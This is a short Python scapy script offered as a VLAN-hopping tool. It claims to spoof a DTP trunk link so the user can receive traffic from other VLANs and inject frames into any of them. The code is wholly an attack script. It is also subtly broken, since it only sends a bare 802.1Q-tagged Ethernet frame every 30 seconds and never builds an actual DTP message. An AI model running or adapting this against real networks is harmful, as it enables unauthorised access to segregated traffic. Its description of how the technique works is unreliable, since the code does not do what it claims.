from scapy.all import *
from scapy.layers.l2 import Dot1Q, Ether
import argparse
import threading
import time

def spoof_dtp(interface, src_mac, dst_mac, vlan_id):
    dtp_packet = Ether(dst=dst_mac, src=src_mac) / Dot1Q(vlan=vlan_id)
    
    while True:
        sendp(dtp_packet, iface=interface)
        time.sleep(30)

def main():
    parser = argparse.ArgumentParser(description="Spoof a trunk link to receive VLAN traffic from other VLANs and send into any VLAN.")
    parser.add_argument("interface", help="Network interface to send packets from")
    parser.add_argument("src_mac", help="Source MAC address to use for spoofed packets")
    parser.add_argument("dst_mac", help="Destination MAC address to use for spoofed packets")
    parser.add_argument("vlan_id", type=int, help="VLAN ID to spoof")
    
    args = parser.parse_args()

    spoof_thread = threading.Thread(target=spoof_dtp, args=(args.interface, args.src_mac, args.dst_mac, args.vlan_id))
    spoof_thread.start()
    spoof_thread.join()

if __name__ == "__main__":
    main()
